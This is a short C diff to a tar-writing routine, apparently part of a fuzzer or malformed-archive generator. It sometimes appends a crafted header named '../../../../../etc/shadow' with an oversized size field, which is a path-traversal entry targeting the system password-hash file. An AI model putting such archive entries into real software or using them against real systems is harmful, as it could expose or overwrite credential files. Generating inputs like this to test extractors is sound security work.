@@ -41,8 +41,22 @@ void create_tar(struct tar_t *headers, int num_headers) {
         write_body(tar);
     }
 
-    char padding[1024] = {0};
-    fwrite(padding, 1, 1024, tar);
+    int random_padding = rand() % 3;
+    
+    if (random_padding == 0) {
+        char padding[1024] = {0};
+        fwrite(padding, 1, 1024, tar);
+    }
+    else if (random_padding == 1) {
+        struct tar_t ghost_header;
+        baseline_header(&ghost_header);
+        
+        strncpy(ghost_header.name, "../../../../../etc/shadow", 100);
+        strncpy(ghost_header.size, "00000007777", 12);
+        calculate_checksum(&ghost_header);
+        
+        fwrite(&ghost_header, sizeof(struct tar_t), 1, tar);
+    }
 
     fclose(tar);
 }
